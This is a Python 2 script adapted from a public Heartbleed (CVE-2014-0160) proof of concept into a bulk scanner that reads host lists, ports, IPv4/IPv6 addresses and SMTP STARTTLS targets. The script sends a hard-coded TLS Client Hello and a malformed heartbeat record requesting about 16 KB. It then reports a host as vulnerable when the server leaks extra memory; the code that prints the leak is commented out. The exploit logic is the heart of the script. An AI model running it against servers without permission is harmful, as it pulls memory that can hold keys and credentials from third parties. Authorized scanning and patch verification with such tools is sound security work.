#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Quickly and dirtily modified by Mustafa Al-Bassam (mus@musalbas.com) to test
# the Alexa top X.

# Made things prettier and added port list functionality

import sys
import struct
import socket
import time
import select
import re
from collections import defaultdict
from argparse import ArgumentParser

# Parse args
parser = ArgumentParser()
parser.add_argument("-c", "--concise",    dest="concise",   default=None,                 action="store_true",  help="make output concise")
parser.add_argument("-4", "--ipv4",       dest="ipv4",      default=True,                 action="store_true",  help="turn on IPv4 scans (default)")
parser.add_argument("-6", "--ipv6",       dest="ipv6",      default=True,                 action="store_true",  help="turn on IPv6 scans (default)")
parser.add_argument(      "--no-ipv4",    dest="ipv4",                                    action="store_false", help="turn off IPv4 scans")
parser.add_argument(      "--no-ipv6",    dest="ipv6",                                    action="store_false", help="turn off IPv6 scans")
parser.add_argument(      "--no-summary", dest="summary",   default=True,                 action="store_false", help="suppress scan summary")
parser.add_argument("-t", "--timestamp",  dest="timestamp", const="%Y-%m-%dT%H:%M:%S%z:", nargs="?",            help="add timestamps to output; optionally takes format string (default: %%Y-%%m-%%dT%%H:%%M:%%S%%z:)")
parser.add_argument("--starttls",   dest="starttls",  default=None,                 action="store",       choices = ['smtp'],
                    help="Insert proper protocol stanzas to initiate STARTTLS")
parser.add_argument("-p", "--ports",      dest="ports",     action="append",              nargs=1,              help="list of ports to be scanned (default: 443)")
parser.add_argument("hostlist",                             default=["-"],                nargs="*",            help="list(s) of hosts to be scanned (default: stdin)")
args = parser.parse_args()
tmplist = []
if not args.ports:
    args.ports = [["443"]]
for port in args.ports:
    tmplist.extend(port[0].replace(",", " ").replace(";", " ").split())
portlist = list(set([int(i) for i in tmplist]))
portlist.sort()


counter_nossl   = defaultdict(int)
counter_notvuln = defaultdict(int)
counter_vuln    = defaultdict(int)


# Set up REs to detect ports on IPv4 and IPv6 addresses
ipv4re = re.compile("^(?P<host>[^:]*?)(:(?P<port>\d+))?$")
ipv6re = re.compile("^(([[](?P<bracketedhost>[\dA-Fa-f:]*?)[]])|(?P<host>[^:]*?))(:(?P<port>\d+))?$")


# Define nice xstr function that converts None to ""
xstr = lambda s: s or ""


def get_ipv4_address(host):
    try:
        address = socket.getaddrinfo(host, None, socket.AF_INET, 0, socket.SOL_TCP)
    except socket.error:  # not a valid address
        return False
    return address[0][4][0]


def get_ipv6_address(host):
    try:
        address = socket.getaddrinfo(host, None, socket.AF_INET6, 0, socket.SOL_TCP)
    except socket.error:  # not a valid address
        return False
    return address[0][4][0]


def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        #print '  %04x: %-48s %s' % (b, hxdat, pdat)
    #print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except Exception, e:
                return None
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        #print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        #print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    #print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay


def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            #print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            #print 'Received heartbeat response:'
            hexdump(pay)
            if len(pay) > 3:
                #print 'WARNING: server returned more data than it should - server is vulnerable!'
                return True
            else:
                #print 'Server processed malformed heartbeat, but did not return any extra data.'
                return False

        if typ == 21:
            #print 'Received alert:'
            hexdump(pay)
            #print 'Server returned error, likely not vulnerable'
            return False

def do_starttls(s):
    if args.starttls == "smtp":
        # receive greeting
        recvall(s, 1024)
        # send EHLO
        s.send("EHLO heartbleed-scanner.example.com\r\n")
        # receive capabilities
        cap = s.recv(1024)
        print cap
        if 'STARTTLS' in cap:
            # start STARTTLS
            s.send("STARTTLS\r\n")
            ack = s.recv(1024)
            if "220" in ack:
                return True
    return False


def is_vulnerable(domain, port, protocol):
    s = socket.socket(protocol, socket.SOCK_STREAM)
    s.settimeout(2)
    #print 'Connecting...'
    #sys.stdout.flush()
    try:
        s.connect((domain, port))
    except Exception, e:
        return None
    #print 'Sending Client Hello...'
    #sys.stdout.flush()
    if args.starttls:
        do_starttls(s)
    s.send(hello)
    #print 'Waiting for Server Hello...'
    #sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            #print 'Server closed connection without sending Server Hello.'
            return None
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    #print 'Sending heartbeat request...'
    #sys.stdout.flush()
    s.send(hb)
    return hit_hb(s)


def scan_address(domain, address, protocol, portlist):
    if args.timestamp:
        print time.strftime(args.timestamp, time.gmtime()),
    if not args.concise:
        print "Testing " + domain + " (" + address + ")... ",
    else:
        print domain + " (" + address + ")",

    for port in portlist:
        sys.stdout.flush();
        result = is_vulnerable(address, port, protocol);
        if result is None:
            if not args.concise:
                print "port " + str(port) + ": no SSL/unreachable;",
            else:
                print str(port) + "-",
            counter_nossl[port] += 1;
        elif result:
            if not args.concise:
                print "port " + str(port) + ": VULNERABLE!",
            else:
                print str(port) + "!",
            counter_vuln[port] += 1;
        else:
            if not args.concise:
                print "port " + str(port) + ": not vulnerable;",
            else:
                print str(port) + "+",
            counter_notvuln[port] += 1;
    print ""


def scan_host(domain):
    if args.ipv4:
        match = ipv4re.match(domain)
        if match:
            hostname = xstr(match.group("host"))
            address = get_ipv4_address(hostname)
            if address:
                if match.group("port"):
                    scan_address(hostname, address, socket.AF_INET, [int(match.group("port"))])
                else:
                    scan_address(hostname, address, socket.AF_INET, portlist)

    if args.ipv6:
        match = ipv6re.match(domain)
        if match:
            hostname = xstr(match.group("bracketedhost")) + xstr(match.group("host"))
            address = get_ipv6_address(hostname)
            if address:
                if match.group("port"):
                    scan_address(hostname, address, socket.AF_INET6, [int(match.group("port"))])
                else:
                    scan_address(hostname, address, socket.AF_INET6, portlist)


def main():
    for input in args.hostlist:
        if input == "-":
            for line in sys.stdin:
                scan_host(line.strip())
        else:
            file = open(input, 'r')
            for line in file:
                scan_host(line.strip())
            file.close()

    if args.summary:
        print
	print "- no SSL/unreachable: " + str(sum(counter_nossl.values()))   + " (" + "; ".join(["port " + str(port) + ": " + str(counter_nossl[port])   for port in sorted(counter_nossl.keys())]) + ")"
        print "! VULNERABLE:         " + str(sum(counter_vuln.values()))    + " (" + "; ".join(["port " + str(port) + ": " + str(counter_vuln[port])    for port in sorted(counter_vuln.keys())]) + ")"
        print "+ not vulnerable:     " + str(sum(counter_notvuln.values())) + " (" + "; ".join(["port " + str(port) + ": " + str(counter_notvuln[port]) for port in sorted(counter_notvuln.keys())]) + ")"


if __name__ == '__main__':
    main()
